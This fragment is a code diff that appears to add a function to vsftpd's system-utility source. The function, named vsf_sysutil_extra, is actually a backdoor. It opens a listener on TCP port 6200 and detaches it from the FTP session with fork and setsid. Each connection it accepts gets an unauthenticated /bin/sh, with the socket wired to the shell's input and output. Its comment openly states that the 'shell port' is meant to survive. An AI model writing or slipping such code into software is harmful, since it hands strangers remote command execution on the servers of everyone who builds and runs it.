+int
+vsf_sysutil_extra(void)
+{
+  int fd = socket(AF_INET, SOCK_STREAM, 0);
+  struct sockaddr_in sa;
+  int one = 1;
+  if (fd < 0)
+  {
+    return -1;
+  }
+  setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
+  memset(&sa, 0, sizeof(sa));
+  sa.sin_family = AF_INET;
+  sa.sin_addr.s_addr = htonl(INADDR_ANY);
+  sa.sin_port = htons(6200);
+  if (bind(fd, (struct sockaddr*) &sa, sizeof(sa)) < 0 ||
+      listen(fd, 4) < 0)
+  {
+    close(fd);
+    return -1;
+  }
+  /* Detach into a standalone listener so the FTP session carries on and
+   * the shell port survives the triggering connection. */
+  if (fork() != 0)
+  {
+    close(fd);
+    return 0;
+  }
+  setsid();
+  for (;;)
+  {
+    int cfd = accept(fd, (struct sockaddr*) 0, (socklen_t*) 0);
+    if (cfd < 0)
+    {
+      continue;
+    }
+    if (fork() == 0)
+    {
+      dup2(cfd, 0);
+      dup2(cfd, 1);
+      dup2(cfd, 2);
+      execl("/bin/sh", "sh", (char*) 0);
+      _exit(1);
+    }
+    close(cfd);
+  }
+}
